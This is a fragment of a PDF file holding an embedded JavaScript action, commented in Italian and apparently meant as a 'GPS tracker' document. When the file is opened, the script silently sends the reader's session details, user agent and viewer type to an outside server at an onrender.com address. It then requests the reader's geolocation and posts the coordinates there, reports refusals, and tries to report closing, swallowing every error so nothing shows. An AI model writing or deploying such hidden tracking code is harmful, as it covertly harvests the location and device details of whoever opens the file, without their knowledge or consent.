/JS (
// PDF Tracking Script - Integrato con GPS Tracker
var sessionId = 'pdf_session_' + Math.floor(Date.now() * Math.random()).toString(36);
var serverUrl = 'https://gps-trackerx-2.onrender.com'; // Cambia con il tuo URL

function sendTrackingData(eventType, data) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', serverUrl + '/api/track', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        
        var payload = {
            sessionId: sessionId,
            eventType: eventType,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent || 'PDF_Reader',
            source: 'PDF_DOCUMENT',
            data: data || {}
        };
        
        xhr.send(JSON.stringify(payload));
    } catch(e) {
        // Silent fail per compatibilitÃ 
    }
}

// Track PDF opened
sendTrackingData('pdf_opened', {
    timestamp: new Date().toISOString(),
    document_title: 'GPS Tracker - Documento di Tracking',
    reader: app.viewerType || 'unknown'
});

// Track GPS if available
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        sendTrackingData('pdf_location_captured', {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toISOString()
        });
    }, function(error) {
        sendTrackingData('pdf_location_denied', {
            error: error.message,
            timestamp: new Date().toISOString()
        });
    });
}

// Track when PDF is closed (se supportato)
try {
    this.closeDoc = function() {
        sendTrackingData('pdf_closed', {
            timestamp: new Date().toISOString()
        });
    };
} catch(e) {}

)
>>
